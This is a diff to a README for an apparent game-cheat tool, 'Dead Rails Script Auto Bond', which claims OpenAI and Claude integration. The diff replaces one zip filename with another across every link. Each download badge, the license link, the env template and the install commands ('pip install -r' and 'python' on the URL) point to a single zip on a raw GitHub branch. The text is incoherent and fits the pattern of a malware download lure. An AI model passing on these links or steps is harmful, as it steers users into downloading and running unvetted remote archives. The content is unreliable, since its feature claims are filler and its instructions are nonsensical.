@@ -1,6 +1,6 @@
 # Dead Rails Script Auto Bond
 
-[![Download](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip%20DeadRails-green?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip)
+[![Download](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip%20DeadRails-green?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip)
 
 Welcome to **Dead Rails Script Auto Bond**, a cutting-edge tool designed to revolutionize the way you automate and bond scripts with enhanced intelligence and seamless integration. This repository is the locomotive that keeps your script automation journey on track, combining OpenAI and Claude API powers under one hood! 🚄
 
@@ -12,11 +12,11 @@ Where does our engine run? Find your operating system ticket below!
 
 | Platform            | Supported | Notes                      |
 |---------------------|:---------:|----------------------------|
-| ![Windows](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip%2B-blue?logo=windows) | ✔️ | Fully compatible, 2025 and beyond |
-| ![macOS](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip+-lightgrey?logo=apple) | ✔️ | Native support for Apple users    |
-| ![Linux](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip%20%2F%20Debian-blue?logo=linux) | ✔️ | Optimized for major distros       |
-| ![Android](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip%2B-green?logo=android) | 🔸 | CLI support, experimental         |
-| ![iOS](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip%2B-lightgrey?logo=apple) | 🔸 | Remote API bonding only           |
+| ![Windows](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip%2B-blue?logo=windows) | ✔️ | Fully compatible, 2025 and beyond |
+| ![macOS](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip+-lightgrey?logo=apple) | ✔️ | Native support for Apple users    |
+| ![Linux](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip%20%2F%20Debian-blue?logo=linux) | ✔️ | Optimized for major distros       |
+| ![Android](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip%2B-green?logo=android) | 🔸 | CLI support, experimental         |
+| ![iOS](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip%2B-lightgrey?logo=apple) | 🔸 | Remote API bonding only           |
 
 ---
 
@@ -73,21 +73,21 @@ Got a midnight automation breakdown? Our dedicated conductors are ready to put y
 To start your journey, please follow these carefully mapped steps:
 
 1. **Download the Latest Release**  
-   [![Download](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip%20DeadRails-green?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip)
+   [![Download](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip%20DeadRails-green?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip)
 
 2. **Extract the package** into your preferred directory.
 
 3. **Install dependencies**  
    - For Windows/macOS/Linux, run:  
-     `pip install -r https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip`
+     `pip install -r https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip`
    - For Linux, ensure you have Python 3.8+ and relevant build-essentials.
 
 4. **Configure your environment**  
-   Place your API keys as specified in `https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip` (copy and rename to `.env`).
+   Place your API keys as specified in `https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip` (copy and rename to `.env`).
 
 5. **Run the application**  
    Start the main engine:  
-   `python https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip`
+   `python https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip`
 
 6. **Access the Dashboard**  
    Navigate to `http://localhost:8080` in your browser to get rolling!
@@ -116,10 +116,10 @@ Let your operations run as smooth as rails polished by a thousand journeys!
 ## 📜 MIT License
 
 This repository is released under the MIT License.  
-View the full license [here](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip).
+View the full license [here](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip).
 
 © 2025 Dead Rails Automation - All Aboard!
 
 ---
 
-[![Download](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip%20DeadRails-green?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/dead-rails-auto-bond-script-laserwort.zip)
+[![Download](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip%20DeadRails-green?logo=github&style=for-the-badge)](https://raw.githubusercontent.com/chauvanhung/dead-rails-auto-bond-script/branch/conflation/auto-dead-rails-bond-script-v2.8-beta.2.zip)
